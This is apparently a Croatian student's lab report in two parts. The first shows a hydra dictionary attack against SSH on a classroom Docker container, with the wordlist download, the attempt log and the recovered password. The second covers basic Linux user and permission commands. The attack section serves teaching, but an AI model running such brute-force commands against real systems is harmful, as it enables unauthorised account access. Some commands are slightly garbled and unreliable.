# Peta i šesta laboratorijska vježba

## **Peta vježba**

Kroz ovu vježbi smo radili online password guessing attack. Probali smo koristeći unaprijed definirani dictionary pronaći lozinku iz njega koja se podudara s mojim korisničkim imenom na Docker containeru. S obzirom da smo radili online napad aktivno smo kontaktirali server i pokušavali se prijaviti direktno na određenu IP adresu.

```bash
Microsoft Windows [Version 10.0.19043.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Users\A507>wsl
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ wget -r -nH -np --reject "index.html*" http://a507-server.locary/g3/dictionar
--2022-01-11 11:03:36--  http://a507-server.local:8080/dictionary/g3/
Resolving a507-server.local (a507-server.local)... 10.0.1.172, fe80::aaa1:59ff:fe69:5278
Connecting to a507-server.local (a507-server.local)|10.0.1.172|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘dictionary/g3/index.html.tmp’

dictionary/g3/index.html.tmp      [ <=>                                              ]   4.59K  --.-KB/s    in 0s

2022-01-11 11:03:36 (259 MB/s) - ‘dictionary/g3/index.html.tmp’ saved [4700]

Loading robots.txt; please ignore errors.
--2022-01-11 11:03:36--  http://a507-server.local:8080/robots.txt
Reusing existing connection to a507-server.local:8080.
HTTP request sent, awaiting response... 404 Not Found
2022-01-11 11:03:36 ERROR 404: Not Found.

Removing dictionary/g3/index.html.tmp since it should be rejected.

--2022-01-11 11:03:36--  http://a507-server.local:8080/dictionary/g3/dictionary_offline.txt
Reusing existing connection to a507-server.local:8080.
HTTP request sent, awaiting response... 200 OK
Length: 350546 (342K) [text/plain]
Saving to: ‘dictionary/g3/dictionary_offline.txt’

dictionary/g3/dictionary_offl 100%[=================================================>] 342.33K  --.-KB/s    in 0.03s

2022-01-11 11:03:36 (11.7 MB/s) - ‘dictionary/g3/dictionary_offline.txt’ saved [350546/350546]

--2022-01-11 11:03:36--  http://a507-server.local:8080/dictionary/g3/dictionary_online.txt
Reusing existing connection to a507-server.local:8080.
HTTP request sent, awaiting response... 200 OK
Length: 3346 (3.3K) [text/plain]
Saving to: ‘dictionary/g3/dictionary_online.txt’

dictionary/g3/dictionary_onli 100%[=================================================>]   3.27K  --.-KB/s    in 0s

2022-01-11 11:03:36 (287 MB/s) - ‘dictionary/g3/dictionary_online.txt’ saved [3346/3346]

FINISHED --2022-01-11 11:03:36--
Total wall clock time: 0.09s
Downloaded: 3 files, 350K in 0.03s (12.0 MB/s)

student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l jukic_marija -P dictionary/g3/dictionary_online.txt 10.0.15.0 -V -t
4 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-11 11:05:27
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 478 login tries (l:1/p:478), ~120 tries per task
[DATA] attacking ssh://10.0.15.0:22/
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajtal" - 1 of 478 [child 0] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajpgz" - 2 of 478 [child 1] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajtnj" - 3 of 478 [child 2] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajplk" - 4 of 478 [child 3] (0/0)
....
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajtlp" - 331 of 478 [child 0] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "kajtgz" - 332 of 478 [child 2] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "cowona" - 333 of 478 [child 3] (0/0)
[ATTEMPT] target 10.0.15.0 - login "jukic_marija" - pass "thened" - 334 of 478 [child 1] (0/0)
[22][ssh] host: 10.0.15.0   login: jukic_marija   password: thened
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-11 11:11:04
```

Uspjela sam pronaći lozinku koja je bila unutar dictionaryja koja se podudarala s lozinkom na docker containeru s mojim imenom. Nažalost statistika nije bila na mojoj strani, pa se moja lozinka nalazila na drugoj polovici dictionaryja pa je za pronalazak podudaranja trebalo malo više vremena.

S obzirom na ograničeno vrijeme nismo stigli napraviti offline password guessing attack.

## Šesta vježba

Kroz ovu vježbu smo učili kako upravljati korisničkim računima na linuxu, odnosno istraživali smo kontrolu pristupu.

U Linux-u svaka datoteka ili program (binary executable file) ima vlasnika (user or owner). Svakom korisniku pridjeljen je jedinstveni identifikator User ID (UID). Svaki korisnik mora pripadati barem jednoj grupi (group), pri čemu više korisnika može dijeliti istu grupu. Linux grupe također imaju jedinstvene identifikatore Group ID (GID).
S id provjeravamo identifikatore uid i gid za korisnika te pripadnost grupama.
Kad koristimo sudo to nam daje administratorska prava tj. s time dokazujemo da pripadamo grupi sudo.
```bash
sudo adduser alice3
sudo adduser bob3
```
S ovom komandom kreiramo nove korisnike koji pripadaju određenim grupama i imaju određeni uid i guid.
Da bi ušli u ove korisničke račune koristimo sljedeću naredbu:
```bash
sudo - alice3
exit
```
Exit koristimo unutar shella korisnika za vraćanje na shell s administratorskim ovlastima.
Česte linux komande su mkdir za kreiranje novih direktorija, cd za ulazak ili cd.. za izlazak iz nekog direktorija, za ispis nekog filea koristimo cat.
Kreiramo neki file s tekstom na sljedeći način:
```bash
echo "Hello world" > security.txt
```
Naredbama ls -l ili getfacl prikazujemo informacije o direktoriju i datotekama
```bash
alice3@DESKTOP-7Q0BASR:~/SRP$ getfacl security.txt
file: security.txt
owner: alice3
group: alice3
user::rw-
group::rw-
other::r--
```
Za file security.txt alice3 moze čitati i pisati unutar njega kao i user. Dok svi ostali korisnici mogu samo čitati taj file
